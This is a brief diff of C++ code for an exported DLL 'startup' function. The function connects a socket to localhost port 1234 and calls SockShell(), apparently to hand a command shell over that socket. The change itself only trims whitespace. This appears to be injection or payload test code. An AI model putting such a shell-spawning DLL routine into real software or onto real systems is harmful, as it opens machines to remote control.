@@ -8,7 +8,7 @@ extern "C" __declspec(dllexport) void startup()
     MessageBeep(MB_ICONERROR);
 
     SockConnect("localhost", "1234");
-    SockShell();    
+    SockShell();
     ExitThread(0);
 }
 
